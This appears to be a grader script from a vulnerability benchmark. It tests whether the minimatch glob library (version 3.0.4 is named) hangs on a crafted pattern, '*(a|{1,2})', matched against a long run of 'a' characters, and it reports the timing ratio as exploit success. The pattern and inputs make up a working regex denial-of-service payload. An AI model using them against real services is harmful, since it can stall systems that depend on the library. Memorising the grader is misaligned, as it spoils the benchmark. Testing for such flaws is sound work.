let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  const minimatch = require('minimatch');

  // Benign API validation first.
  const ok1 = minimatch('abc.js', '*.js') === true;
  const ok2 = minimatch('abc.txt', '*.js') === false;
  if (!ok1 || !ok2) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'benign_operation_failed:ok1=' + ok1 + ';ok2=' + ok2;
    finish();
  } else {
    operation_completed = true;

    // ReDoS trigger pattern for vulnerable minimatch versions.
    const pattern = '*(a|{1,2})';

    // Choose bounded sizes that still show clear timing separation on vulnerable builds.
    const controlInput = 'a'.repeat(32);
    const maliciousInput = 'a'.repeat(4000);

    function elapsedMs(fn) {
      const start = process.hrtime.bigint();
      fn();
      const end = process.hrtime.bigint();
      return Number(end - start) / 1e6;
    }

    let controlResult;
    let maliciousResult;

    // Warmup/compile path to reduce one-time variance.
    minimatch('warmup', pattern);

    let controlMs;
    try {
      // Average multiple runs for stable baseline.
      let sum = 0;
      for (let i = 0; i < 8; i++) {
        sum += elapsedMs(function () {
          controlResult = minimatch(controlInput, pattern);
        });
      }
      controlMs = sum / 8;
    } catch (e) {
      operation_completed = false;
      exploit_succeeded = false;
      evidence = 'control_call_failed:' + (e && e.message ? e.message : String(e));
      finish();
      return;
    }

    let maliciousMs;
    try {
      maliciousMs = elapsedMs(function () {
        maliciousResult = minimatch(maliciousInput, pattern);
      });
    } catch (e) {
      // After benign success, malicious throw means blocked.
      exploit_succeeded = false;
      evidence = 'malicious_threw:' + (e && e.message ? e.message : String(e));
      finish();
      return;
    }

    const ratio = maliciousMs / Math.max(controlMs, 0.0001);

    // Vulnerable 3.0.4 should show very large slowdown; patched versions should not.
    exploit_succeeded = ratio > 80 && maliciousMs > 30;

    evidence =
      'pattern=' + pattern +
      ';control_len=' + controlInput.length +
      ';malicious_len=' + maliciousInput.length +
      ';control_ms=' + controlMs.toFixed(3) +
      ';malicious_ms=' + maliciousMs.toFixed(3) +
      ';ratio=' + ratio.toFixed(2) +
      ';control_result=' + String(controlResult) +
      ';malicious_result=' + String(maliciousResult);

    finish();
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_module_failure:' + (e && e.message ? e.message : String(e));
  finish();
}